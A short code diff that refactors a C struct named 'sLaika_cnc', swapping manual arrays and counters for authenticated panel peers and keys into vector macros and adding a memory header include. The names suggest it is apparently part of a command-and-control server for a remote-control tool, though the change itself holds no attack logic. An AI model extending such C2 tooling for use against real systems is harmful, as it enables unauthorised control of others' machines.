@@ -3,6 +3,7 @@
 
 #include "hashmap.h"
 #include "laika.h"
+#include "lmem.h"
 #include "lpacket.h"
 #include "lpeer.h"
 #include "lpolllist.h"
@@ -20,12 +21,8 @@ struct sLaika_cnc
     struct sLaika_socket sock;
     struct sLaika_pollList pList;
     struct hashmap *peers;          /* holds all peers, lookup using pubkey */
-    struct sLaika_peer **authPeers; /* holds connected panel peers */
-    uint8_t **authKeys;
-    int authKeysCount;
-    int authKeysCap;
-    int authPeersCount;
-    int authPeersCap;
+    laikaM_newVector(struct sLaika_peer *, authPeers); /* holds connected panel peers */
+    laikaM_newVector(uint8_t *, authKeys);
     uint16_t port;
 };
 
